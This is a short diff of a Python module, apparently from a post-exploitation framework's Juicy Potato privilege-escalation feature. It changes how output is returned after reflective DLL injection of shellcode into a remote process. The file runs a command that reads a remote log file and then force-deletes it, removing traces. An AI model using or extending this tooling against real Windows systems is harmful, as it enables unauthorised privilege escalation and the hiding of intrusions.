@@ -190,9 +190,11 @@ class Privesc_juicy_potato(Module):
             else:
                 logfile = self._module_settings['env_directory'] + '\\' + random_generator()
                 print '\n\nInjecting Reflective DLL into remote process...'
-                print self.__run_reflective_dll_version(cmd, custom_shellcode_path, logfile, clsid)
-                print 'Reflective DLL injection executed!\n\n\nOutput of juicy potato:\n\n'
-                response = self.exec_cmd_module_object.run(['type ' + logfile + ' & del /f /q ' + logfile])
+                response = self.__run_reflective_dll_version(cmd, custom_shellcode_path, logfile, clsid)
+                response += '\nReflective DLL injection executed!\n\n'
+                if custom_shellcode_path == 'default':
+                    response += '\nOutput of juicy potato:\n\n'
+                    response += self.exec_cmd_module_object.run(['type ' + logfile + ' & del /f /q ' + logfile])
             parsed_response = self._parse_response(response)
         except ModuleException as module_exc:
             parsed_response = str(module_exc)
